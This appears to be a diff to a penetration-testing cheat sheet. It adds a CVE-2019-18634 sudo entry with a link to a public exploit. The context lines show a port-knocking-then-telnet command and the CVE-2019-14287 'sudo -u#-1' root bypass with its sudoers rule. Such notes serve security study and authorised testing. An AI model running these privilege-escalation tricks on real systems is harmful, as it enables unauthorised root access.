@@ -287,6 +287,10 @@ knock <ip> 7000 8000 9000 7000 8000 9000 && telnet <ip> 8888
 CVE-2019-14287
 <user> ALL=(ALL:!root) NOPASSWD: ALL
 sudo -u#-1 command
+
+CVE-2019-18634
+https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
+
 ```
 
 
